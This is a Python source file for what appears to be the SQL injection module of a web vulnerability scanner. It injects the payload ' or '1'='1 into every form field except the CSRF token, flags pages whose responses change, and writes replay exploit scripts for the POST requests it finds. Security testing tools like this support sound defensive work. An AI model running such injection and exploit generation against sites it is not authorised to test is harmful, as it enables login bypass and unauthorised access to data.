import httplib2
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, post_request, create_post_params, log_results
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "sqli"
EXPLOIT_CLASS = "SQL Injection"


class SQLIModule:
    """
    SQL Injection Module
    Checks for SQLI vulnerability
    """

    def __init__(self, url, pages):
        self.url = url
        self.pages = pages
        self.logs = {}

    def generate_exploits(self):
        counter = 0
        for target in self.logs["results"]:
            for vuln in self.logs["results"][target]:
                fp = open(EXPLOIT_PATH + EXPLOIT_TYPE + str(counter) + ".py", "w")
                fp.write("import urllib, urllib2, cookielib, webbrowser, os\n")
                endpoint = target + vuln["endpoint"]
                if vuln["method"] == "POST":
                   fp.write('url = "'+endpoint+'"\n')
                   fp.write('values = '+str(vuln["params"])+'\n')
                   fp.write('data = urllib.urlencode(values)\n')
                   fp.write('req = urllib2.Request(url, data)\n')
                   fp.write('rsp = urllib2.urlopen(req)\n')
                   fp.write('content = rsp.read()\n')
                   fp.write('tmp_file = "/tmp/tmp.html"\n')
                   fp.write('fp = open(tmp_file, "w")\n')
                   fp.write('fp.write(content)\n')
                   fp.write('fp.close()\n')
                   fp.write('webbrowser.open("file://" + os.path.realpath(tmp_file))\n')
                # elif vuln["method"] == "GET":
                    # TODO: Finish this part
                fp.close()
                counter += 1

    def scan(self):
        results = []
        for web_page in self.pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            if has_form(response):
                forms = parse_form(response)
                original_response = post_request(web_page, forms)
                injection_forms = []
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        injection_forms.append(form_input)
                    else:
                        injection_forms.append((form_input[0], "' or '1'='1"))
                new_response = post_request(web_page, injection_forms)
                if original_response != new_response: # That means that the webpage is different, possibly a successful case
                    results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
        self.logs = log_results(results, EXPLOIT_CLASS)
